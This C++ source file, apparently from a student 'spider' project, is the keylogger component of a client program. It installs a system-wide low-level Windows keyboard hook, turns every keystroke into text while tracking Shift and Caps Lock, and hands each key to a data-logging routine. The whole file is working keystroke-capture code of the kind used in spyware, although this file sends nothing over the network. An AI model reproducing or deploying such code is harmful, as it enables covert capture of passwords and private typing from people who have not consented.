/*
** KeyboardListener.cpp for cpp_spider in /home/gogo/rendu/cpp_spider/client/src/KeyboardListener.cpp
**
** Made by Gauthier Cler
** Login   <gauthier.cler@epitech.eu>
**
** Started on  Sun Oct 08 22:13:57 2017 Gauthier Cler
** Last update Sun Oct 08 22:13:59 2017 Gauthier Cler
*/

#include <unordered_map>
#include "KeyboardListener.hpp"
#include "Data.hpp"

std::unordered_map<std::string, std::string> _unprintableKeysCode = {
		{"ENTER",  "\n"},
		{"SPACE",  " "},
		{"TAB",    "\t"},
		{"ENTREE", "\n"},
		{"ESPACE", " "}
};

bool Client::KeyboardListener::isMaj(std::string key) {
	return (key == "SHIFT" || key == "MAJ");
}

bool Client::KeyboardListener::isCaps(std::string key) {
	return (key == "CAPSLOCK" || key == "VERR.MAJ");
}

Client::KeyboardListener::KeyboardListener() {
}

Client::KeyboardListener::~KeyboardListener() {

}

__declspec(dllexport) LRESULT CALLBACK keyboardHook(int code, WPARAM Wparam, LPARAM Lparam) {

	if (code == HC_ACTION) {
		KBDLLHOOKSTRUCT *hookData;
		LONG hookKey;
		char keyBuffer[255];
		std::string keyName;
		static bool isCaps = false, isShifted = false;

		hookData = (KBDLLHOOKSTRUCT *) Lparam;
		hookKey = (hookData->scanCode << 16) + (hookData->flags << 24);
		GetKeyNameText(hookKey, keyBuffer, 255);
		keyName.assign(keyBuffer);

		if (Wparam == WM_KEYUP || Wparam == WM_SYSKEYUP) {
			if (Client::KeyboardListener::isMaj(keyName)) {
				isShifted = false;
			}
			return (CallNextHookEx(nullptr, code, Wparam, Lparam));
		}

		Client::KeyboardListener::isCaps(keyName) ? isCaps = !isCaps : 0;
		Client::KeyboardListener::isMaj(keyName) ? isShifted = true : 0;

		auto unprintableSequence = _unprintableKeysCode.find(keyName);
		if (unprintableSequence != _unprintableKeysCode.end()) {
			keyName.assign(unprintableSequence->second);
		} else if (keyName.length() > 1) {
			keyName.insert(keyName.begin(), '[');
			keyName.append("]");
		}

		if (keyName.length() <= 1) {
			if (isCaps == isShifted) {
				boost::to_lower(keyName);
			} else {
				boost::to_upper(keyName);
			}
		}
		Client::Data::get().logData(keyName, Client::Data::DataType::KEY);
	}

	return (CallNextHookEx(nullptr, code, Wparam, Lparam));
}

void Client::KeyboardListener::createHook(HINSTANCE const &moduleHandle) {
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHook, moduleHandle, NULL))) {
		throw Spider::Error("Keyboard Hook Crash");
	}
}

void Client::KeyboardListener::removeHook() {
	UnhookWindowsHookEx(_hook);
}
